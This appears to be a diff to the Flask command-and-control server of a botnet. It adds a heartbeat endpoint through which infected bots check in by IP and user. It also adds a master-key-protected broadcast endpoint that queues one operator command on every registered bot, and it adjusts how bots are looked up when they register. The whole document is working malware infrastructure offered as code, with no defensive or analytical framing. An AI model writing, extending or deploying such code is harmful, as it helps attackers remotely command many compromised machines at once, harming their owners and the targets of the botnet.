@@ -32,6 +32,24 @@ def init_db():
 def hello_world():
     return "Hello, world!"
 
+@app.route('/heartbeat', methods=['POST'])
+def heartbeat():
+
+    if request.method != 'POST':
+        return jsonify({'error': 'wrong HTTP method'})
+
+    data = request.form
+
+    ip = data['ip']
+    user = data['user']
+
+    print("[DEBUG] user = ", user)
+
+    query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
+    query_bot.set_timestamp(datetime.now())
+
+    return 'heartbeat'
+
 @app.route('/firstcontact', methods=['POST'])
 def firstcontact(): 
     """
@@ -104,7 +122,7 @@ def register():
         #print ("[DEBUG] os = ", bot_os)
         
         try:
-            query_bot = Bot.query.filter_by(ip=bot_ip).first()
+            query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
         except Exception as e:
             print("[!]", e)
 
@@ -251,7 +269,6 @@ def botresult(bot_ip):
                 db.session.commit()
                 
                 # This needs to be changed 
-                #return result
                 return '' 
 
         # If a master is visiting the endpoint, return the result to the master 
@@ -296,8 +313,6 @@ def botlist():
     for bot in botlist:
         result += bot.get_info() + '\n'
 
-    #print(type(botlist))
-
     return result
 
 @app.route('/bot/commands', methods=['GET'])
@@ -311,6 +326,45 @@ def commandlist():
         #print (command.get_info())
 
     return result 
+
+"""
+    query_bot = Bot.query.filter_by(ip=bot_ip).first()
+    cmd = Command(cmd, query_bot.id, bot_ip)
+    #cmd.set_latest_true()
+
+    if len(query_bot.cmds) < 1:
+        try:
+            query_bot.cmds.append(cmd)
+            db.session.add(cmd)
+            db.session.commit()
+"""
+
+@app.route('/bot/broadcast', methods=['POST'])
+def broadcast():
+    if request.method != 'POST':
+        return jsonify({'error': 'wrong HTTP method'})
+
+    data = request.form
+
+    masterkey = data['masterkey']
+    command = data['cmd']
+
+    if data is None:
+        return jsonify({'error': 'body cannot be empty'})
+    elif masterkey != MASTERKEY:
+        return jsonify({'error': 'you are not master'})
+    elif command is None:
+        return jsonify({'error': 'command cannot be null'})
+
+    bots = Bot.query.all()
+
+    for bot in bots:
+        cmd = Command(command, bot.id, bot.ip)
+        bot.cmds.append(cmd)
+        db.session.add(cmd)
+    db.session.commit()
+
+
 
 
 init_db()
